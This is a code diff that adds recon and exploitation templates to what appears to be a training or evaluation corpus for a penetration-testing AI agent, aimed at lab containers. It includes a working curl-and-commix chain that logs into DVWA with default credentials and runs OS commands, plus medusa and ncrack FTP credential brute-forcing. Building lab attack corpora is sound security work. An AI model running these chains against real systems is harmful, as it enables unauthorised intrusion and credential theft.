@@ -165,6 +165,233 @@ SINGLE_STAGE_TEMPLATES = [
             {"target": "172.25.0.3", "port": "80"},
         ],
     },
+    {
+        # User-supplied recipe, syntax CORRECTED before shipping (checked
+        # statically against real nmap -oG output, not run live yet --
+        # see verified=False below). Original used `grep Up |
+        # awk '{print $2}'`, which only extracts the IP by coincidence
+        # when the host has no reverse-DNS name -- confirmed via a real
+        # `nmap -oG -` run: a resolvable host produces
+        # "Host: 1.2.3.4 (some.host)\tStatus: Up", where $2 is the
+        # hostname in parens, not the IP. Also confirmed `--open` fully
+        # suppresses the Status:Up line when a host has zero open ports
+        # in range, so grepping "Up" alone doesn't guarantee a matching
+        # Ports: line follows for that host either. Fixed to grep the
+        # Ports: line directly (same reliable filter the sibling
+        # masscan_nmap_searchsploit_chain template already uses) and pull
+        # the IP out of the Host: field with sub(), which is
+        # hostname-agnostic.
+        "template_id": "nmap_open_grep_xargs_ffuf",
+        "verified": False,
+        "stage_1": [
+            {
+                "tool": "run_command",
+                "command": (
+                    "nmap -p{port} --open -oG - {target} | grep 'Ports:' "
+                    "| awk -F'\\t' '{{host=$1; sub(/^Host: /,\"\",host); "
+                    "sub(/ \\(.*\\)$/,\"\",host); print host}}' "
+                    "| xargs -I {{}} ffuf -u http://{{}}:{port}/FUZZ "
+                    "-w {wordlist} -recursion"
+                ),
+            },
+        ],
+        "variations": [
+            {
+                "target": "172.17.0.13", "port": "3000",
+                "wordlist": "/usr/share/wordlists/seclists/Fuzzing/fuzz-Bo0oM.txt",
+            },
+        ],
+    },
+    {
+        # User-supplied recipe. LIVE-TESTED against 172.17.0.13:3000 and
+        # confirmed to need a real fix, found in two passes: this target
+        # answers HTTP 200 for ANY path (a Node/Express-style SPA
+        # catchall) at a fixed response length of 9393 bytes, which trips
+        # gobuster's own wildcard-response detector -- it aborts outright
+        # ("the server returns a status code that matches the provided
+        # options for non existing urls... Please exclude the response
+        # length or the status code or set the wildcard option"). First
+        # attempt added a `--wildcard` flag by analogy with other fuzzers
+        # (ffuf/wfuzz have filter-size options under different names) --
+        # WRONG, this gobuster version (checked via `gobuster dir --help`
+        # on the real container) has no such flag at all and fails with
+        # "flag provided but not defined: -wildcard". The tool's own
+        # error message already named the real remedy --
+        # `--exclude-length`, given the exact catchall byte count it
+        # measured. On a catchall target, most surviving hits will still
+        # be same-length false positives if the catchall length happens
+        # to shift per-path (rare but possible); genuinely useful hits
+        # are ones whose Content-Length differs from the catchall
+        # baseline, which the downstream curl -I step's header lets a
+        # human/model reviewer filter by post hoc. gobuster's own
+        # $1-column-is-the-path extraction was confirmed correct as-is.
+        "template_id": "gobuster_dir_xargs_curl_head",
+        "verified": False,
+        "stage_1": [
+            {
+                "tool": "run_command",
+                "command": (
+                    "gobuster dir -u http://{target}:{port} -w {wordlist} -t {threads} "
+                    "--no-error -q --exclude-length {exclude_length} | awk '{{print $1}}' "
+                    "| xargs -I {{}} curl -I http://{target}:{port}{{}}"
+                ),
+            },
+        ],
+        "variations": [
+            {
+                "target": "172.17.0.13", "port": "3000", "threads": "50",
+                "wordlist": "/usr/share/wordlists/rockyou.txt",
+                "exclude_length": "9393",
+            },
+        ],
+    },
+    {
+        # User-supplied recipe, syntax CORRECTED TWICE before shipping --
+        # first pass (whitespace columns 5-7 of the whole -oG line) was
+        # wrong per the docstring below; SECOND bug found by actually
+        # running the "fixed" version in the real kali-agent-box
+        # container against 172.17.0.12: `grep -oE '.../tcp[^,\t]*'`
+        # returned EMPTY. Root cause: GNU grep -E does not treat \t
+        # inside a [^...] bracket expression as a tab escape (that's a
+        # -P/PCRE-only extension) -- it reads \t as the two literal
+        # characters backslash and t, so the class excludes any literal
+        # "t" and the match truncates at the t in "http" ("open/tcp//h").
+        # A tab was never actually needed in the exclusion set here --
+        # grep 'Ports:' already isolated the one line where tabs matter
+        # (separating Host:/Ports:/Ignored State:), and within a single
+        # port's slash-delimited sub-record there is no tab to exclude,
+        # only the comma that separates it from the NEXT port on a
+        # multi-port line. Dropped \t from the class; re-ran live and
+        # confirmed a real Apache version string comes back correctly.
+        "template_id": "nmap_sV_grep_field_searchsploit",
+        "verified": False,
+        "stage_1": [
+            {
+                "tool": "run_command",
+                "command": (
+                    "nmap -sV -p{port} --open -oG - {target} 2>/dev/null | grep 'Ports:' "
+                    "| grep -oE '{port}/open/tcp[^,]*' | awk -F'/' '{{print $6, $7}}' "
+                    "| sed '/^[[:space:]]*$/d' "
+                    "| xargs -I {{}} searchsploit {{}}"
+                ),
+            },
+        ],
+        "variations": [
+            {"target": "172.17.0.13", "port": "3000"},
+        ],
+    },
+    {
+        # User-supplied recipe, syntax CORRECTED TWICE (same two bugs as
+        # nmap_sV_grep_field_searchsploit above, found the same way --
+        # first a reasoned-through fix for the whitespace-column issue,
+        # THEN a real failure caught by actually running it live in the
+        # kali-agent-box container against 172.17.0.12, which returned
+        # nothing despite a genuinely open, versioned Apache on port 80).
+        # Root cause #2: identical `[^,\t]` grep -E bracket-expression bug
+        # -- \t is not a tab escape inside [^...] under -E (PCRE/-P only),
+        # so it's read as literal "\" + "t" and truncates at the t in
+        # "http". Also worth noting from this same live run: this
+        # target's nmap -oG Host: field is "172.17.0.12 ()" -- EMPTY
+        # parens, not omitted parens and not a resolved hostname -- a
+        # third shape beyond the two (with-hostname, no-parens-at-all)
+        # checked when nmap_open_grep_xargs_ffuf was fixed earlier. Its
+        # sub(/ \(.*\)$/,"",host) pattern already handles this shape fine
+        # (matches empty parens too), so no further fix needed there, but
+        # worth keeping in mind for any FUTURE Host:-field parsing added
+        # to this file. Dropped \t from the class here the same way;
+        # re-ran live against 172.17.0.12 and got a real Apache version
+        # string back correctly.
+        "template_id": "nmap_sV_multiport_field_searchsploit",
+        "verified": False,
+        "stage_1": [
+            {
+                "tool": "run_command",
+                "command": (
+                    "nmap -sV -p{ports} --open -oG - {target} 2>/dev/null | grep 'Ports:' "
+                    "| grep -oE '[0-9]+/open/tcp[^,]*' | awk -F'/' '{{print $6, $7}}' "
+                    "| sed '/^[[:space:]]*$/d' "
+                    "| xargs -I {{}} searchsploit {{}}"
+                ),
+            },
+        ],
+        "variations": [
+            {"target": "172.17.0.12", "ports": "80,443,3306"},
+        ],
+    },
+    {
+        # STRUCTURED run_dirb call (not run_command) -- dirb is a genuine
+        # second, independent directory-brute tool alongside run_gobuster/
+        # run_ffuf, directly addressing the tool-imbalance gap (dirb had
+        # zero examples anywhere in the corpus before this template).
+        # LIVE-VERIFIED end to end against DVWA (172.17.0.12): a real run
+        # scanned all 4612 words in seclists' dirb/common.txt and found 6
+        # real hits, including a listable /config/ directory (the same
+        # known real lead CLAUDE.md documents from earlier DVWA sessions)
+        # -- dirb correctly recursed into found directories and correctly
+        # skipped re-scanning ones already flagged listable, per its own
+        # WARNING output. NOTE: dirb was tried first against the
+        # juice-shop target (172.17.0.13:3000) and reliably crashed that
+        # specific container (a real target-side Node heap/stability
+        # issue under sustained brute-force request volume, confirmed via
+        # `docker logs` showing "JavaScript heap out of memory" --
+        # unrelated to dirb's own correctness) -- DVWA is the stable
+        # choice for this template until that target's own stability is
+        # addressed separately.
+        "template_id": "dirb_recon",
+        "verified": True,
+        "stage_1": [
+            {"tool": "run_dirb", "target": "http://{target}/", "wordlist": "{wordlist}"},
+        ],
+        "variations": [
+            {"target": "172.17.0.12", "wordlist": "/usr/share/wordlists/dirb/common.txt"},
+        ],
+    },
+    {
+        # STRUCTURED run_katana call -- katana had ZERO examples anywhere
+        # in the corpus before this template (one of the 4 tools README's
+        # Known Gaps calls out by name). LIVE-VERIFIED against the
+        # WordPress lab target (172.26.0.3, "wp2shell"): a real crawl
+        # surfaced genuine recon leads a directory-brute tool wouldn't --
+        # /xmlrpc.php?rsd (WordPress's XML-RPC endpoint, a known brute-
+        # force-amplification/pingback-abuse vector) and /author/admin/
+        # (username enumeration via the author archive URL pattern) --
+        # both organically discovered by following real links/JS/JSON
+        # references on the page, which is katana's actual differentiator
+        # from a wordlist-based brute-forcer like run_dirb/run_gobuster.
+        "template_id": "katana_crawl_wordpress",
+        "verified": True,
+        "stage_1": [
+            {"tool": "run_katana", "target": "http://{target}", "depth": "{depth}"},
+        ],
+        "variations": [
+            {"target": "172.26.0.3", "depth": "2"},
+        ],
+    },
+    {
+        # STRUCTURED run_ffuf call -- ffuf had zero examples anywhere in
+        # the corpus before this template, despite being a genuinely
+        # different tool from run_gobuster/run_dirb (fast, Go-based,
+        # designed for parameter/path fuzzing beyond plain directory
+        # brute-force). LIVE-VERIFIED against the WordPress lab target
+        # (172.26.0.3) using seclists' own CMS/wordpress.fuzz.txt wordlist
+        # (a WordPress-specific path list, not the generic common.txt
+        # run_dirb/run_gobuster's templates use) -- real hits included
+        # readme.html/license.txt, which leak the exact installed
+        # WordPress version even on a target that otherwise doesn't
+        # expose it, a genuinely different recon value than a plain
+        # directory listing.
+        "template_id": "ffuf_wordpress_fuzz",
+        "verified": True,
+        "stage_1": [
+            {"tool": "run_ffuf", "url": "http://{target}", "wordlist": "{wordlist}", "param": "FUZZ"},
+        ],
+        "variations": [
+            {
+                "target": "172.26.0.3",
+                "wordlist": "/usr/share/wordlists/seclists/Discovery/Web-Content/CMS/wordpress.fuzz.txt",
+            },
+        ],
+    },
 ]
 
 # --- Two-stage (stage-1 -> stage-2) templates -------------------------------
@@ -213,6 +440,87 @@ TWO_STAGE_TEMPLATES = [
             },
         ],
     },
+    {
+        # A single-stage (not two-stage) recipe -- login+cookie-capture
+        # and the actual commix exploitation are BOTH folded into one
+        # run_command shell invocation (same $host/$port-capture trick
+        # masscan_nmap_searchsploit_chain uses), specifically to avoid the
+        # dynamic-cross-step-value gap the removed authenticated_sqli_
+        # dump_chain hit (see the note below) -- there is no separate
+        # structured run_commix step here needing a value only stage 1
+        # discovers, because there IS no separate step; the whole thing
+        # is one shell command where $COOKIE is a real bash variable, not
+        # a template placeholder. DVWA's default admin/password
+        # credentials are this lab image's well-known intentional
+        # default, not a "discovered" secret.
+        #
+        # LIVE-VERIFIED end to end against DVWA (172.17.0.12), 3/3 clean
+        # runs (including 2 launched CONCURRENTLY, to rule out any
+        # session-collision worry) with this exact final command shape --
+        # but getting here took a real, instructive debugging detour
+        # worth keeping: an EARLIER version of this recipe's login step
+        # used a separate anonymous GET (no cookie jar) for the CSRF
+        # token, then a SEPARATE POST with no -b/no -c at all, relying on
+        # DVWA/PHP happening to mint a fresh session on that POST whose
+        # Set-Cookie response header could be grepped back out. That
+        # "worked" 2 of the first 3 times it was tried, which looked
+        # exactly like commix's own detection being non-deterministic --
+        # it wasn't. Confirmed by direct inspection: DVWA's login only
+        # succeeds (Location: index.php) when the SAME PHPSESSID from the
+        # initial GET is carried into the login POST (via -b AND -c on
+        # BOTH curl calls against one cookie-jar file) -- without that,
+        # the CSRF token doesn't validate against the right server-side
+        # session, login silently redirects back to login.php instead of
+        # index.php, and commix spends its whole run testing the
+        # (unauthenticated) login page's own content for injectability,
+        # which of course never succeeds. The jar already holds the
+        # correct PHPSESSID after -c, so the fixed version below reads it
+        # straight from the jar file instead of re-parsing a Set-Cookie
+        # response header. Real command execution confirmed each clean
+        # run (`id` -> "uid=33(www-data) gid=33(www-data)
+        # groups=33(www-data)"; `whoami` -> "www-data" x2 more). Also
+        # required --ignore-stdin (commix silently ignores -u and treats
+        # stdin as a bulk target list under any non-interactive invocation
+        # otherwise) and --answers='shell=N,random=Y,use the URL=Y,
+        # Insufficient=Y' (--batch does NOT suppress several interactive
+        # follow-up prompts after a confirmed injection; --answers matches
+        # by SUBSTRING against the live prompt text, so key names must be
+        # unique to their own prompt -- an earlier attempt used
+        # 'directory=N' as a key, which also substring-matched a
+        # DIFFERENT free-text prompt ("Enter a writable directory...")
+        # and forced the literal string "N" in as a bogus directory path;
+        # fixed by choosing longer, verified-unique substrings and by
+        # answering the free-text directory prompt not at all, letting it
+        # fall through to its own sensible default) -- see run_commix's
+        # own tools.py docstring for the full diagnosis; both fixes are
+        # baked into _run_commix itself, so any run_commix call gets them
+        # automatically, not just this recipe.
+        "template_id": "dvwa_commix_exec_chain",
+        "verified": True,
+        "stage_1": [
+            {
+                "tool": "run_command",
+                "command": (
+                    "curl -s -c /tmp/dvwa_cj.txt {target}/login.php -o /tmp/dvwa_login.html && "
+                    "TOKEN=$(grep -oE \"user_token' value='[a-f0-9]+\" /tmp/dvwa_login.html "
+                    "| grep -oE '[a-f0-9]{{32}}') && "
+                    "curl -s -b /tmp/dvwa_cj.txt -c /tmp/dvwa_cj.txt -X POST {target}/login.php "
+                    "--data \"username={username}&password={password}&Login=Login&user_token=$TOKEN\" "
+                    "-o /dev/null && "
+                    "COOKIE=\"$(grep PHPSESSID /tmp/dvwa_cj.txt | awk '{{print $6\"=\"$7}}'); security=low\" && "
+                    "commix -u {target}/vulnerabilities/exec/ --batch --ignore-stdin -p ip "
+                    "--data='ip=127.0.0.1&Submit=Submit' --cookie=\"$COOKIE\" "
+                    "--os-cmd={os_cmd} --answers='shell=N,random=Y,use the URL=Y,Insufficient=Y'"
+                ),
+            },
+        ],
+        "variations": [
+            {
+                "target": "http://172.17.0.12", "username": "admin", "password": "password",
+                "os_cmd": "id",
+            },
+        ],
+    },
     # NOTE: an "authenticated_sqli_dump_chain" template (gobuster -> login
     # -> sqlmap with the resulting session cookie) was drafted and
     # DELIBERATELY REMOVED here, not shipped -- it needs a real PHPSESSID
@@ -227,7 +535,85 @@ TWO_STAGE_TEMPLATES = [
     # gap for any future two-stage template that needs a stage-1-captured
     # dynamic value (a session cookie, a CSRF token, a discovered
     # credential) fed into a structured stage-2 tool call -- see README's
-    # Known Gaps.
+    # Known Gaps. dvwa_commix_exec_chain above sidesteps the exact same
+    # wall by staying single-stage/single-shell-invocation rather than
+    # solving cross-step value passing generally -- run_sqlmap's cookie
+    # need in a genuinely TWO-STAGE template (separate stage_1/stage_2
+    # structured calls) is still unaddressed.
+    {
+        # STRUCTURED run_medusa call in stage_2 -- medusa had ZERO
+        # examples anywhere in the corpus before this template (one of
+        # the 4 tools README's Known Gaps calls out by name). Genuinely
+        # exploit_conditional, not exploit_authorized: nmap's ftp-anon
+        # NSE script gives a clean, deterministic real-output string
+        # ("Anonymous FTP login allowed") to gate on -- stage 2 only
+        # proceeds because stage 1's REAL scan confirmed anonymous access
+        # is enabled on THIS target, not a blanket override. LIVE-
+        # VERIFIED against the lab's FTP container (172.25.0.2,
+        # vsftpd 3.0.3): nmap's ftp-anon script confirmed the condition
+        # for real, and a real medusa run against user "anonymous"
+        # correctly reported every password in the wordlist as
+        # ACCOUNT FOUND -- worth being honest in the row's own semantics
+        # that this isn't really "cracking" a password, it's confirming
+        # an intentionally-open anonymous account accepts anything,
+        # which is itself the actual finding a real engagement would
+        # report (not "we brute-forced FTP").
+        "template_id": "ftp_anon_medusa_chain",
+        "verified": True,
+        "condition_check": "Anonymous FTP login allowed",
+        "stage_1": [
+            {"tool": "run_nmap", "target": "{target}", "flags": "-p21 -sV --script ftp-anon"},
+        ],
+        "stage_2": [
+            {
+                "tool": "run_medusa", "target": "{target}", "service": "ftp",
+                "username": "anonymous", "wordlist": "{wordlist}",
+            },
+        ],
+        "variations": [
+            {
+                "target": "172.25.0.2",
+                "wordlist": "/usr/share/seclists/Passwords/Common-Credentials/top-20-common-SSH-passwords.txt",
+            },
+        ],
+    },
+    {
+        # STRUCTURED run_ncrack call in stage_2 -- ncrack had ZERO
+        # examples anywhere in the corpus before this template (the last
+        # of the 4 tools README's Known Gaps calls out by name; with this
+        # and ftp_anon_medusa_chain above, all 4 zero-coverage tools
+        # (run_netstat/run_ncrack/run_medusa/run_katana) now have at
+        # least one real recipe -- run_netstat's own genuinely fits
+        # nowhere naturally as a REMOTE recon step since it reports the
+        # scanning HOST's own listening sockets, not the target's, so it
+        # remains a documented gap rather than forced into a misleading
+        # recipe). Same exploit_conditional gating as the medusa sibling
+        # -- same real nmap ftp-anon confirmation, different credential-
+        # attack tool for genuine tool-diversity on the identical
+        # confirmed-anonymous target, not just a copy-paste of the
+        # medusa recipe. LIVE-VERIFIED against 172.25.0.2 through the
+        # real run_ncrack dispatch (not just the bare ncrack CLI) --
+        # confirmed real output: "Discovered credentials for ftp on
+        # 172.25.0.2 21/tcp: 'anonymous' 'root'".
+        "template_id": "ftp_anon_ncrack_chain",
+        "verified": True,
+        "condition_check": "Anonymous FTP login allowed",
+        "stage_1": [
+            {"tool": "run_nmap", "target": "{target}", "flags": "-p21 -sV --script ftp-anon"},
+        ],
+        "stage_2": [
+            {
+                "tool": "run_ncrack", "target": "{target}", "service": "ftp",
+                "users": "anonymous", "wordlist": "{wordlist}",
+            },
+        ],
+        "variations": [
+            {
+                "target": "172.25.0.2",
+                "wordlist": "/usr/share/seclists/Passwords/Common-Credentials/top-20-common-SSH-passwords.txt",
+            },
+        ],
+    },
 ]
 
 
